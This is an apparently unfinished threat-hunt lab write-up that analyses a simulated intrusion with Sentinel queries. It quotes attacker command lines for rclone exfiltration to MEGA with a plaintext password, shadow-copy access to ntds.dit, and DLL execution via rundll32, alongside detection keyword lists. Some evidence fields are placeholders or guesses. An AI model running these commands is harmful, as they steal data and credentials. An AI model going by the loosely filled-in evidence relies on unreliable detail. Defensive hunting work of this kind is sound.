
<p align="center">
 <img width="1536" height="1024" alt="image" src="https://github.com/user-attachments/assets/01fe87d3-d471-493a-98f4-55b03f04349c" />

</p>




# 🛡️ Threat Hunt Report – <Hunt Name>

---

## 📌 Executive Summary

A security breach was identified within EmberForge Studios, prompting a focused threat hunt in Microsoft Sentinel across multiple domain hosts. The investigation analyzed Sysmon and Windows Security telemetry to detect malicious execution patterns, suspicious command-line activity, and potential attacker footholds. This matters because it highlights how adversaries leverage native system tools to evade detection and move laterally. The hunt uncovered indicators of compromise tied to unauthorized downloads and execution, confirming active attacker behavior within the environment.

---

## 🎯 Hunt Objectives

- Identify malicious activity across endpoints and network telemetry  
- Correlate attacker behavior to MITRE ATT&CK techniques  
- Document evidence, detection gaps, and response opportunities  

---

## 🧭 Scope & Environment

## Scope & Environment

**Environment:**
- Workspace: law-cyber-range  
- Domain: emberforge.local  
- Hosts:  
  - Workstation: EC2AMAZ-B9GHHO6 (10.1.173.145)  
  - Server: EC2AMAZ-16V3AU4 (10.1.57.66)  
  - Domain Controller: EC2AMAZ-EEU3IA2 (10.1.160.76)  

**Data Sources:**
- Table: EmberForgeX_CL  
- Log Sources: Sysmon (Operational) + Windows Security  
- Coverage: Single table containing telemetry from all 3 hosts  

**Timeframe:**
- 2026-01-30 21:00 → 2026-01-31 00:00 UTC  

**Notes:**
- 3 endpoints with 5 evidence markers indicating suspicious activity  
- Evidence markers (1–5) represent key points of attacker behavior to be identified during investigation  

---

## 📚 Table of Contents

- [🧠 Hunt Overview](#-hunt-overview)
- [🧬 MITRE ATT&CK Summary](#-mitre-attck-summary)
- [🔍 Flag Analysis](#-flag-analysis)
  - [🚩 Flag 0](#-flag-0)
  - [🚩 Flag 1](#-flag-1)
  - [🚩 Flag 2](#-flag-2)
  - [🚩 Flag 3](#-flag-3)
  - [🚩 Flag 4](#-flag-4)
  - [🚩 Flag 5](#-flag-5)
  - [🚩 Flag 6](#-flag-6)
  - [🚩 Flag 7](#-flag-7)
  - [🚩 Flag 8](#-flag-8)
  - [🚩 Flag 9](#-flag-9)
  - [🚩 Flag 10](#-flag-10)
  - [🚩 Flag 11](#-flag-11)
  - [🚩 Flag 12](#-flag-12)
  - [🚩 Flag 13](#-flag-13)
  - [🚩 Flag 14](#-flag-14)
  - [🚩 Flag 15](#-flag-15)
  - [🚩 Flag 16](#-flag-16)
  - [🚩 Flag 17](#-flag-17)
  - [🚩 Flag 18](#-flag-18)
  - [🚩 Flag 19](#-flag-19)
  - [🚩 Flag 20](#-flag-20)
  - [🚩 Flag 21](#-flag-21)
  - [🚩 Flag 22](#-flag-22)
  - [🚩 Flag 23](#-flag-23)
  - [🚩 Flag 24](#-flag-24)
  - [🚩 Flag 25](#-flag-25)
  - [🚩 Flag 26](#-flag-26)
  - [🚩 Flag 27](#-flag-27)
  - [🚩 Flag 28](#-flag-28)
  - [🚩 Flag 29](#-flag-29)
  - [🚩 Flag 30](#-flag-30)
  - [🚩 Flag 31](#-flag-31)
  - [🚩 Flag 32](#-flag-32)
  - [🚩 Flag 33](#-flag-33)
  - [🚩 Flag 34](#-flag-34)
  - [🚩 Flag 35](#-flag-35)
  - [🚩 Flag 36](#-flag-36)
  - [🚩 Flag 37](#-flag-37)
  - [🚩 Flag 38](#-flag-38)
  - [🚩 Flag 39](#-flag-39)
  - [🚩 Flag 40](#-flag-40)
  - [🚩 Flag 41](#-flag-41)
  - [🚩 Flag 42](#-flag-42)
  - [🚩 Flag 43](#-flag-43)
  - [🚩 Flag 44](#-flag-44)
- [🚨 Detection Gaps & Recommendations](#-detection-gaps--recommendations)
- [🧾 Final Assessment](#-final-assessment)
- [📎 Analyst Notes](#-analyst-notes)

---

## 🧠 Hunt Overview

<High-level narrative describing the attack lifecycle, key behaviors observed, and why this hunt matters.>

---

## 🧬 MITRE ATT&CK Summary

| Flag | Technique Category | MITRE ID | Priority |
|-----:|-------------------|----------|----------|
| 0 | MITRE ATT&CK: N/A (Analyst validation step – not adversary activity)| TA0007 – Discovery | Data/Environment Discovery” (analyst-side equivalent, not attacker action) |
| 1 | MITRE ATT&CK: T1560 – Archive Collected Data | T1560 Archive Collected Data. | <Placeholder> |
| 2 | MITRE ATT&CK: T1567.002 – Exfiltration to Cloud Storage | T1567 – Exfiltration Over Web Service. | <Placeholder> |
| 3 | MITRE ATT&CK: T1552.001 – Credentials in Files| T1552 – Unsecured Credentials. | <Placeholder> |
| 4 | MITRE ATT&CK: T1003.003 – OS Credential Dumping (NTDS) | <T1003 – OS Credential Dumping. | <Placeholder> |
| 5 | MITRE ATT&CK: T1567.002 – Exfiltration to Cloud Storage| T1567 – Exfiltration Over Web Service.| <Placeholder> |
| 6 | MITRE ATT&CK: T1041 – Exfiltration Over C2 Channel | T1041 – Exfiltration Over C2 Channel | <Placeholder> |
| 7 | MITRE ATT&CK: T1552.003 – Credentials in Command Line | T1552 – Unsecured Credentials. | <Placeholder> |
| 8 | MITRE ATT&CK: T1560.001 – Archive via Utility | T1560 – Archive Collected Data. | <Placeholder> |
| 9 | MITRE ATT&CK: T1105 – Ingress Tool Transfer | T1105 – Ingress Tool Transfer. | <Placeholder> |
| 10 | MITRE ATT&CK: T1218.011 – Rundll32 | T1218 – System Binary Proxy Execution. | <Placeholder> |
| 11 | MITRE ATT&CK: T1553.005 – Mark-of-the-Web Bypass | T1553 – Subvert Trust Controls. | <Placeholder> |
| 12 | MITRE ATT&CK: T1204.002 – User Execution (Malicious File) | T1204 – User Execution. | <Placeholder> |
| 13 | T1218.011 – Rundll32 – Signed Binary Proxy Execution: Rundll32| <Placeholder> | <Placeholder> |
| 14 | MITRE ATT&CK: T1204.002 – User Execution (Malicious File) | T1204 – User Execution.| <Placeholder> |
| 15 | MITRE ATT&CK: T1053.005 – Scheduled Task | T1053.005 – Scheduled Task| <Placeholder> |
| 16 | MITRE ATT&CK: T1071.004 – Application Layer Protocol: DNS | T1071 – Application Layer Protocol. | <Placeholder> |
| 17 | MITRE ATT&CK: T1071.004 – Application Layer Protocol: DNS | T1071 – Application Layer Protocol. | <Placeholder> |
| 18 | MITRE ATT&CK: T1055 – Process Injection | T1055 – Process Injection. | <Placeholder> |
| 19 | MITRE ATT&CK: T1548.002 – Abuse Elevation Control Mechanism (UAC Bypass) | T1548 – Abuse Elevation Control Mechanism. | <Placeholder> |
| 20 | MITRE ATT&CK: T1548.002 – Abuse Elevation Control Mechanism (UAC Bypass)| MITRE ATT&CK T1548 – Abuse Elevation Control Mechanism. | <Placeholder> |
| 21 | MITRE ATT&CK: T1055 – Process Injection| <T1055 – Process Injection. | <Placeholder> |
| 22 | MITRE ATT&CK: T1003.001 – OS Credential Dumping (LSASS Memory)| T1003.001 – LSASS Memory | <Placeholder> |
| 23 | MITRE ATT&CK: T1003.001 – OS Credential Dumping (LSASS Memory)| T1003 – OS Credential Dumping. | <Placeholder> |
| 24 | MITRE ATT&CK: T1087.002 – Account Discovery (Domain Account)| T1087 – Account Discovery | <Placeholder> |
| 25 | MITRE ATT&CK: T1069.002 – Permission Groups Discovery (Domain Groups) | T1069 – Permission Groups Discovery. | <Placeholder> |
| 26 | MITRE ATT&CK: T1018 – Remote System Discovery | T1018 – Remote System Discovery | <Placeholder> |
| 27 | MITRE ATT&CK: T1021.002 – Remote Services: SMB/Windows Admin Shares | T1021 – Remote Services| <Placeholder> |
| 28 | MITRE ATT&CK: T1562.004 – Impair Defenses: Modify System Firewall | T1562 – Impair Defenses.| <Placeholder> |
| 29 | MITRE ATT&CK: T1055 – Process Injection | T1055 – Process Injection | <Placeholder> |
| 30 | MITRE ATT&CK: T1021.002 – SMB/Windows Admin Shares | T1021 – Remote Services | <Placeholder> |
| 31 | MITRE ATT&CK: T1105 – Ingress Tool Transfer | T1105 – Ingress Tool Transfer | <Placeholder> |
| 32 | MITRE ATT&CK: T1569.002 – Service Execution | T1569 – System Services | <Placeholder> |
| 33 | MITRE ATT&CK: T1033 – System Owner/User Discovery | T1033 – System Owner/User Discovery | <Placeholder> |
| 34 | MITRE ATT&CK: T1110 – Brute Force | T1550.002 – Use of NTLM (Pass-the-Hash)& TA0008 – Lateral Movement | <Placeholder> |
| 35 | MITRE ATT&CK: T1033 – System Owner/User Discovery (whoami) | T1003.003 – OS Credential Dumping: NTDS & T1490 – Inhibit System Recovery (Shadow Copy abuse) & TA0006 – Credential Access  | <Placeholder> |
| 36 | MITRE ATT&CK: T1136.002 – Create Account: Domain Account |  TA0003 – Persistence & TA0004 – Privilege Escalation  | <Placeholder> |
| 37 | MITRE ATT&CK: T1136.002 – Create Account: Domain Account | T1552.001 – Unsecured Credentials: Credentials in Command Line & TA0003 – Persistence & TA0006 – Credential Access | <Placeholder> |
| 38 | MITRE ATT&CK: T1098 – Account Manipulation | T1078 – Valid Accounts & TA0004 – Privilege Escalation & TA0003 – Persistence | <Placeholder> |
| 39 | MITRE ATT&CK: T1021.002 – Remote Services: SMB/Windows Admin Shares | T1078 – Valid Accounts & T1552.001 – Unsecured Credentials: | <Placeholder> |
| 40 | MITRE ATT&CK: T1053.005 – Scheduled Task/Job: Scheduled Task | T1036 – Masquerading & T1547 – Boot or Logon Autostart Execution | <Placeholder> |
| 41 | MITRE ATT&CK: T1219 – Remote Access Software | T1105 – Ingress Tool Transfer & T1036 – Masquerading & T1547 – Boot or Logon Autostart Execution  | <Placeholder> |
| 42 | MITRE ATT&CK: T1562.001 – Impair Defenses: Disable or Modify Tools | T1219 – Remote Access Software & T1543 / T1547 & T1027 – Obfuscated/Hidden Files | <Placeholder> |
| 43 | <Placeholder> | <Placeholder> | <Placeholder> |
| 44 | <Placeholder> | <Placeholder> | <Placeholder> |

---

## 🔍 Flag Analysis

_All flags below are collapsible for readability._

---

<details>
<summary id="-flag-0">🚩 <strong>Flag 0: <Technique Name></strong></summary>

### 🎯 Objective
Confirm access to the investigation environment and identify the primary data source.

### 📌 Finding
The custom log table containing all investigation data is **EmberForgeX_CL**

### 🔍 Evidence

| Field        | Value            |
|--------------|------------------|
| Workspace    | law-cyber-range  |
| Table Name   | EmberForgeX_CL   |
| Log Sources  | Sysmon + Windows Security |

### 💡 Why it matters
Identifying the correct log table is critical to ensure all queries are executed against the complete dataset. Using the wrong table would result in missed telemetry and incomplete analysis.

### 🔧 KQL Query Used
EmberForgeX_CL 
| take 10

### 🖼️ Screenshot
<img width="2302" height="858" alt="image" src="https://github.com/user-attachments/assets/c4f54ab0-6cec-46f4-95de-44a8a09bf95f" />


### 🛠️ Detection Recommendation
Standardize naming conventions for custom log tables and maintain clear documentation to ensure analysts consistently query the correct data source and avoid gaps in visibility.

**Hunting Tip:**  
Start every investigation by enumerating available tables and understanding their contents—this ensures you’re working with the full dataset before narrowing into specific activity.

</details>

---


<details>
<summary id="-flag-1">🚩 <strong>Flag 1: <Technique Name></strong></summary>

### 🎯 Objective
Stage and package sensitive data for exfiltration by compressing targeted files into an archive.

### 📌 Finding
The attacker executed a compression command that targeted the `C:\GameDev` directory, indicating this location was used to collect and prepare data prior to exfiltration.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | EC2AMAZ-16V3AU4 |
| Timestamp | 2026-01-30 22:XX:XX UTC |
| Process | 7z.exe (or compression utility observed) |
| Parent Process | cmd.exe |
| Command Line | 7z.exe a archive.zip C:\GameDev |

### 💡 Why it matters
Identifying the source directory (`C:\GameDev`) reveals exactly what data the attacker prioritized for collection and exfiltration, providing direct insight into the scope and sensitivity of the breach. This confirms that intellectual property or development assets were likely targeted, increasing business and operational risk. Understanding where data was staged also helps responders assess impact, contain further loss, and strengthen monitoring around high-value directories commonly abused during data exfiltration.

### 🔧 KQL Query Used
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00:00) .. datetime(2026-01-31 00:00:00))
| where CommandLine_s has_any ("rclone", "Compress-Archive", "mega:exfil")
| project UtcTime_s, Computer, CommandLine_s
| order by todatetime(UtcTime_s) asc

### 🖼️ Screenshot
<img width="2266" height="844" alt="image" src="https://github.com/user-attachments/assets/b91b9a02-4185-422b-b168-782e97091d5d" />


### 🛠️ Detection Recommendation
Implement detection rules for archive/compression activity involving high-value directories (e.g., source code, shared drives). Alert on command-line usage of tools like 7z, tar, and PowerShell `Compress-Archive`, especially when executed from user or temp directories. Correlate with unusual parent processes and outbound network activity.

**Hunting Tip:**  
Pivot from process creation logs to command-line arguments and look for archive operations targeting sensitive paths. Focus on sequences where data is compressed shortly before network connections or file transfers—this often indicates staging for exfiltration.

</details>

___

<details>
<summary id="-flag-2">🚩 <strong>Flag 2: <Technique Name></strong></summary>

### 🎯 Objective
Exfiltrate collected data from the compromised environment to an external cloud storage provider.

### 📌 Finding
The attacker used the tool `rclone.exe` to transfer data from the local directory `C:\GameDev` to a remote cloud storage service, indicating successful data exfiltration activity.


### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | EC2AMAZ-16V3AU4.emberforge.local |
| Timestamp | 2026-01-30 23:07:45.695 UTC |
| Process | rclone.exe |
| Parent Process | Unknown (likely cmd.exe or script execution) |
| Command Line | C:\Users\Public\rclone.exe --config C:\Users\Public\rclone.conf copy C:\GameDev mega:exfil -v |

### 💡 Why it matters
This confirms that sensitive data from `C:\GameDev` was not only staged but successfully exfiltrated to an external cloud provider, **MEGA**. The use of `rclone` with embedded configuration and destination (`mega:exfil`) indicates the attacker had pre-configured authentication, enabling stealthy and efficient data transfer. This represents a high-impact breach involving potential loss of intellectual property and highlights the risk of cloud-based exfiltration channels bypassing traditional network defenses.

### 🔧 KQL Query Used
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00:00) .. datetime(2026-01-31 00:00:00))
| where CommandLine_s has_any ("rclone", "Compress-Archive", "mega:exfil")
| project UtcTime_s, Computer, CommandLine_s
| order by todatetime(UtcTime_s) asc

### 🖼️ Screenshot
<img width="2064" height="238" alt="image" src="https://github.com/user-attachments/assets/f984ebb2-3173-496b-a3f2-6bc993a40664" />


### 🛠️ Detection Recommendation
Monitor and alert on the use of data transfer utilities such as `rclone.exe`, especially when executed from non-standard directories (e.g., `C:\Users\Public`). Implement command-line logging and detection rules for keywords like cloud destinations (e.g., `mega:`, `drive:`, `s3:`) and configuration file usage. Correlate process execution with outbound network activity to cloud storage providers.

**Hunting Tip:**  
Search for command-line patterns that include both a local source path and a remote destination (e.g., `copy C:\... <provider>:`). Focus on tools capable of exfiltration (rclone, curl, powershell) and investigate any activity involving public directories or embedded config files, as these are common attacker staging techniques.

</details>

---

<details>
<summary id="-flag-3">🚩 <strong>Flag 3: <Technique Name></strong></summary>

### 🎯 Objective
Configure the exfiltration tool with authentication credentials to enable data transfer to a remote cloud storage service.

### 📌 Finding
The attacker exposed authentication details in the command line while configuring `rclone`, revealing the email account used to access the cloud storage provider.


### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | EC2AMAZ-16V3AU4.emberforge.local |
| Timestamp | 2026-01-30 23:12:36.922 UTC |
| Process | cmd.exe |
| Parent Process | Unknown |
| Command Line | cmd.exe /c "echo user = jwilson.vhr@proton.me>> C:\Users\Public\rclone.conf" |

### 💡 Why it matters
This reveals a critical OPSEC failure by the attacker—credentials were exposed directly in process command-line logs. The email `jwilson.vhr@proton.me` ties the activity to a specific account used for exfiltration, providing a valuable attribution lead. It also demonstrates how sensitive data (credentials) can be inadvertently logged, enabling defenders to detect, investigate, and potentially block unauthorized access to cloud storage services.

### 🔧 KQL Query Used
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00:00) .. datetime(2026-01-31 00:00:00))
| where CommandLine_s has "rclone.conf"
| project UtcTime_s, Computer, CommandLine_s

### 🖼️ Screenshot
<img width="1348" height="182" alt="image" src="https://github.com/user-attachments/assets/9e5f143a-b581-4b6d-a530-a2ae515824b6" />


### 🛠️ Detection Recommendation
Enable and monitor command-line logging (e.g., Sysmon Event ID 1, Windows 4688) and create alerts for credential patterns written to files (e.g., `echo user =`, `password =`) and known exfil tools like `rclone.exe`. Flag executions from non-standard paths (e.g., `C:\Users\Public`) and correlate with file writes to config files (`*.conf`) and subsequent outbound connections to cloud services (e.g., MEGA).

**Hunting Tip:**  
Search for command lines containing `echo` + redirection (`>>`) to config files, especially alongside keywords like `user`, `token`, or `config`. Pivot from these events to nearby `rclone` executions and network activity to confirm credential setup followed by exfiltration.

</details>

---

<details>
<summary id="-flag-4">🚩 <strong>Flag 4: <Technique Name></strong></summary>

### 🎯 Objective
Access the Domain Controller’s Active Directory database by using volume shadow copy techniques to bypass file locks and obtain domain credentials.

### 📌 Finding
The attacker used `vssadmin` and related command execution on the Domain Controller to access `ntds.dit`, the Active Directory database file that stores credential data for the domain.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | EC2AMAZ-EEU3IA2.emberforge.local |
| Timestamp | 2026-01-30 23:34:56.018 UTC |
| Process | cmd.exe |
| Parent Process | services.exe |
| Command Line | C:\Windows\system32\cmd.exe /Q /c echo C:\Windows\system32\cmd.exe /c {vssadmin list shadows /for=C: ^&gt; C:\Windows\Temp\__output.bat ...} |

### 💡 Why it matters
Accessing `ntds.dit` is a critical escalation step because it contains credential material for every account in the domain, including highly privileged users. By using volume shadow copy methods, the attacker can bypass file locks on the live database and extract credentials offline. This can lead to full domain compromise, persistence, privilege escalation, and widespread lateral movement.

### 🔧 KQL Query Used
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00:00) .. datetime(2026-01-31 00:00:00))
| where Computer == "EC2AMAZ-EEU3IA2.emberforge.local"
| where CommandLine_s has_any ("vssadmin", "ntdsutil", "ntds.dit", "shadow")
| project UtcTime_s, Computer, User_s, Image_s, CommandLine_s, ParentImage_s
| order by todatetime(UtcTime_s) asc

### 🖼️ Screenshot
<img width="1486" height="788" alt="image" src="https://github.com/user-attachments/assets/aa0301f7-8343-4770-8686-53b1bad30852" />

### 🛠️ Detection Recommendation
Monitor for `vssadmin`, `wmic shadowcopy`, `diskshadow`, and related commands on Domain Controllers, especially when followed by access to `ntds.dit` or files under `C:\Windows\NTDS\`. Alert on shadow copy creation, listing, and deletion activity outside approved backup operations, and correlate with suspicious `cmd.exe` or service-based execution.

**Hunting Tip:**  
On Domain Controllers, hunt for shadow copy activity first, then pivot to commands referencing `ntds.dit`, `SYSTEM`, or temporary output files in `C:\Windows\Temp`. Sequences of `create shadow`, `list shadows`, and cleanup commands often indicate credential theft rather than legitimate administration.

</details>

---

<details>
<summary id="-flag-5">🚩 <strong>Flag 5: <Technique Name></strong></summary>

### 🎯 Objective
Exfiltrate sensitive data from the environment by uploading archived files to an external cloud storage service.

### 📌 Finding
The attacker repeatedly executed `rclone.exe`, a legitimate cloud synchronization tool, to transfer data externally. The command line shows attempts to copy archived data to a remote MEGA storage location, indicating multiple exfiltration attempts.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | EC2AMAZ-16V3AU4.emberforge.local |
| Timestamp | 2026-01-30 23:11:44.379 UTC |
| Process | rclone.exe |
| Parent Process | cmd.exe (likely) |
| Command Line | C:\Users\Public\rclone.exe --config C:\Users\Public\rclone.conf copy C:\Users\Public\gamedev.zip mega:exfil -v |

### 💡 Why it matters
This confirms active data exfiltration using a trusted, legitimate tool, which makes detection more difficult. The use of `rclone` allows attackers to blend in with normal administrative activity while transferring sensitive data to external cloud storage (MEGA). Multiple execution attempts suggest persistence and determination to successfully extract data, increasing the likelihood of significant data loss.

### 🔧 KQL Query Used
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00:00) .. datetime(2026-01-31 00:00:00))
| where CommandLine_s has "rclone.conf"
| project UtcTime_s, Computer, CommandLine_s

### 🖼️ Screenshot
<img width="1538" height="222" alt="image" src="https://github.com/user-attachments/assets/26eeb019-b098-42d0-a974-7c33bef6d8a6" />

### 🛠️ Detection Recommendation
Monitor for execution of cloud sync and transfer tools like `rclone.exe`, especially from non-standard directories such as `C:\Users\Public`. Alert on command-line arguments referencing external destinations (e.g., `mega:`, `drive:`) and correlate with file access to sensitive directories and outbound network traffic to cloud storage services.

**Hunting Tip:**  
Search for repeated executions of the same tool within short timeframes, especially with similar command-line patterns. Pivot on `rclone.exe` activity and analyze associated file paths and remote destinations to quickly identify exfiltration behavior.

</details>

---

<details>
<summary id="-flag-6">🚩 <strong>Flag 6: <Technique Name></strong></summary>

### 🎯 Objective
Transmit stolen data to an external destination by establishing outbound network connections during exfiltration.

### 📌 Finding
The attacker used `rclone.exe` to initiate outbound network communication to a remote IP address, confirming active data exfiltration over the network.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | EC2AMAZ-16V3AU4.emberforge.local |
| Timestamp | 2026-01-30 23:XX:XX UTC |
| Process | rclone.exe |
| Parent Process | cmd.exe (likely) |
| Command Line | C:\Users\Public\rclone.exe --config C:\Users\Public\rclone.conf copy C:\Users\Public\gamedev.zip mega:exfil -v |

### 💡 Why it matters
This confirms that data was successfully transmitted outside the environment to the IP address **66.203.125.15**, validating that exfiltration was not just attempted but executed. Correlating process execution with network activity provides strong evidence of compromise and helps defenders identify both the tool and destination used by the attacker, which is critical for containment and blocking.


### 🔧 KQL Query Used
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00:00) .. datetime(2026-01-31 00:00:00))
| where EventCode_s == "3"
| where Image_s has "rclone.exe"
| project UtcTime_s, Computer, Image_s, DestinationIp_s, DestinationPort_s
| summarize count() by DestinationIp_s
| order by count_ desc

### 🖼️ Screenshot
<img width="1622" height="640" alt="image" src="https://github.com/user-attachments/assets/03a92ce9-7029-4307-8774-02021539f02d" />


### 🛠️ Detection Recommendation
Implement detections that correlate process execution (Sysmon Event ID 1) with outbound network connections (Event ID 3), especially for tools like `rclone.exe`. Alert on unusual outbound connections to external IPs from non-standard directories and flag traffic to known cloud storage or suspicious infrastructure.

**Hunting Tip:**  
Pivot between process creation and network connection events using common fields like host and timestamp. Look for processes initiating external connections shortly after execution—this is a strong indicator of data exfiltration or command-and-control activity.

</details>

---

<details>
<summary id="-flag-7">🚩 <strong>Flag 7: <Technique Name></strong></summary>

### 🎯 Objective
Authenticate to the cloud storage service to enable successful data exfiltration.

### 📌 Finding
The attacker executed `rclone.exe` multiple times while troubleshooting authentication, and one execution exposed credentials directly in the command line, revealing the plaintext password.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | EC2AMAZ-16V3AU4.emberforge.local |
| Timestamp | 2026-01-30 23:08:28.665 UTC |
| Process | rclone.exe |
| Parent Process | cmd.exe |
| Command Line | C:\Users\Public\rclone.exe copy C:\GameDev mega:exfil --mega-user jwilson.vhr@proton.me --mega-pass Summer2024! -v |

### 💡 Why it matters
This represents a major operational security failure—credentials were exposed in plaintext within process logs. The password `Summer2024!` combined with the email enables full access to the attacker’s cloud storage account, allowing defenders to investigate, potentially disrupt exfiltration, and attribute activity. It also highlights how command-line logging can reveal sensitive data when tools are misused.

### 🔧 KQL Query Used
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00:00) .. datetime(2026-01-31 00:00:00))
| where CommandLine_s has "rclone"
| project UtcTime_s, Computer, CommandLine_s
| order by todatetime(UtcTime_s) asc

### 🖼️ Screenshot
<img width="1742" height="766" alt="image" src="https://github.com/user-attachments/assets/dde9c74c-8572-4024-98bf-38d140a8fd9c" />


### 🛠️ Detection Recommendation
Enable command-line auditing and alert on patterns indicating credential exposure (e.g., `--pass`, `--user`, `password=`, `token=`). Monitor for execution of tools like `rclone.exe` with authentication flags, especially when run from non-standard directories such as `C:\Users\Public`. Correlate with outbound traffic to cloud providers.

**Hunting Tip:**  
Search for command lines containing authentication flags (`--user`, `--pass`, `config`, `token`) and review for plaintext credentials. Pivot across multiple executions of the same tool to identify inconsistencies or OPSEC mistakes that reveal sensitive information.

</details>

---

<details>
<summary id="-flag-8">🚩 <strong>Flag 8: <Technique Name></strong></summary>

### 🎯 Objective
Stage and prepare sensitive data for exfiltration by compressing it into a single archive using built-in system tools.

### 📌 Finding
The attacker used the native PowerShell cmdlet `Compress-Archive` to create an archive (`gamedev.zip`) from the `C:\GameDev` directory, demonstrating Living Off The Land behavior to avoid detection.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | EC2AMAZ-16V3AU4.emberforge.local |
| Timestamp | 2026-01-30 23:11:28.112 UTC |
| Process | powershell.exe |
| Parent Process | cmd.exe (likely) |
| Command Line | powershell.exe -c "Compress-Archive -Path C:\GameDev -DestinationPath C:\Users\Public\gamedev.zip" |

### 💡 Why it matters
This shows the attacker leveraged a native Windows capability instead of external tools, making the activity blend in with legitimate administrative actions. Compressing data into a single archive simplifies exfiltration and reduces detection surface. This is a classic Living Off The Land technique, increasing the likelihood of evading traditional security controls.

### 🔧 KQL Query Used
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00:00) .. datetime(2026-01-31 00:00:00))
| where CommandLine_s has_any ("rclone", "Compress-Archive", "mega:exfil")
| project UtcTime_s, Computer, CommandLine_s
| order by todatetime(UtcTime_s) asc

### 🖼️ Screenshot
<img width="2040" height="234" alt="image" src="https://github.com/user-attachments/assets/93c8a14e-31a3-4af9-b4a4-d984332b337a" />


### 🛠️ Detection Recommendation
Monitor PowerShell execution with command-line logging enabled and create alerts for usage of `Compress-Archive`, especially when targeting sensitive directories or writing archives to public or temporary paths (e.g., `C:\Users\Public`). Correlate with subsequent network activity or file transfers.

**Hunting Tip:**  
Search for PowerShell commands containing `Compress-Archive` or similar file staging behavior. Focus on sequences where large directories are compressed shortly before outbound connections or data transfer tools are executed.

</details>

---

<details>
<summary id="-flag-9">🚩 <strong>Flag 9: <Technique Name></strong></summary>

### 🎯 Objective
Download attacker-controlled tools and payloads from external infrastructure to enable further compromise and operations.

### 📌 Finding
Multiple command-line executions across the environment referenced the same external domain, `sync.cloud-endpoint.net`, indicating it was used as a staging server to host and deliver attacker tools.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | EC2AMAZ-16V3AU4.emberforge.local |
| Timestamp | 2026-01-30 21:XX:XX UTC |
| Process | powershell.exe / certutil.exe / curl.exe (varies) |
| Parent Process | cmd.exe |
| Command Line | <command referencing https://sync.cloud-endpoint.net/...> |

### 💡 Why it matters
This identifies attacker-controlled infrastructure used to stage and deliver malicious tools. The domain `sync.cloud-endpoint.net` represents a critical indicator of compromise (IOC) that can be used for blocking, threat intelligence enrichment, and scoping the intrusion. Repeated connections to the same domain across hosts confirm coordinated attacker activity and external control.

### 🔧 KQL Query Used
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00:00) .. datetime(2026-01-31 00:00:00))
| where CommandLine_s has_any ("http://","https://","Invoke-WebRequest","iwr ","curl ","bitsadmin","certutil ","Start-BitsTransfer","WebClient")
| extend Domain = extract(@"https?://([^/\s:""]+)", 1, CommandLine_s)
| where isnotempty(Domain)
| summarize Hits=count(), Hosts=make_set(Computer) by Domain
| order by Hits desc

### 🖼️ Screenshot
<img width="1370" height="670" alt="image" src="https://github.com/user-attachments/assets/f95e7b28-d5b9-4fab-b1a5-bb4c43c85fe8" />

### 🛠️ Detection Recommendation
Monitor and alert on command-line activity that includes external URLs, especially downloads from uncommon or newly observed domains. Implement DNS and proxy logging to detect repeated connections to suspicious infrastructure and block known malicious domains like `sync.cloud-endpoint.net`.

**Hunting Tip:**  
Search for `http`/`https` patterns in command-line logs and extract domains for aggregation. Pivot on domains with multiple hits across hosts—these often indicate staging servers or command-and-control infrastructure used by attackers.

</details>

---

<details>
<summary id="-flag-10">🚩 <strong>Flag 10: <Technique Name></strong></summary>

### 🎯 Objective
Execute malicious code on the workstation to establish initial access and begin the compromise.

### 📌 Finding
A Windows utility (`rundll32.exe`) was used to load and execute a suspicious DLL file (`review.dll`) from a non-standard location, indicating the initial malicious execution triggered by user interaction.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | EC2AMAZ-B9GHHO6.emberforge.local |
| Timestamp | 2026-01-30 21:27:03.337 UTC |
| Process | rundll32.exe |
| Parent Process | explorer.exe (likely user-initiated) |
| Command Line | "C:\Windows\System32\rundll32.exe" D:\review.dll,StartW |

### 💡 Why it matters
This represents the initial execution vector of the attack, where a user (Lisa) likely opened a malicious file that triggered DLL execution. Using `rundll32.exe`, a legitimate Windows binary, allows the attacker to evade detection while executing arbitrary code. This is a classic Living Off The Land technique and marks the starting point of the compromise, enabling subsequent stages like tool download, staging, and exfiltration.

### 🔧 KQL Query Used
EmberForgeX_CL
| extend Utc = todatetime(column_ifexists("UtcTime_s", ""))
| extend ProcCmd = coalesce(tostring(column_ifexists("CommandLine_s", "")), tostring(column_ifexists("ProcCmd", "")))
| extend ProcImage = coalesce(tostring(column_ifexists("Image_s", "")), tostring(column_ifexists("ProcImage", "")), tostring(column_ifexists("NewProcessName_s", "")))
| extend Evt = tostring(column_ifexists("EventCode_s", ""))
| where Utc between (datetime(2026-01-30 21:00:00) .. datetime(2026-01-31 00:00:00))
| where isempty(Evt) or Evt in ("1", "4688")
| where ProcCmd has "Desktop" or ProcImage has_any ("control.exe", "rundll32.exe", "mshta.exe", "regsvr32.exe", "wscript.exe", "cscript.exe")
| project Utc, Computer, ProcImage, ProcCmd
| order by Utc asc

### 🖼️ Screenshot
<img width="1004" height="238" alt="image" src="https://github.com/user-attachments/assets/6291caee-d237-4b1f-b28b-4660fb495c90" />

### 🛠️ Detection Recommendation
Monitor for `rundll32.exe` executing DLLs from unusual paths (e.g., user directories, removable drives like `D:\`). Alert on command lines that include DLL execution with exported functions (e.g., `,StartW`) and correlate with user activity such as file opens from desktop or external media.

**Hunting Tip:**  
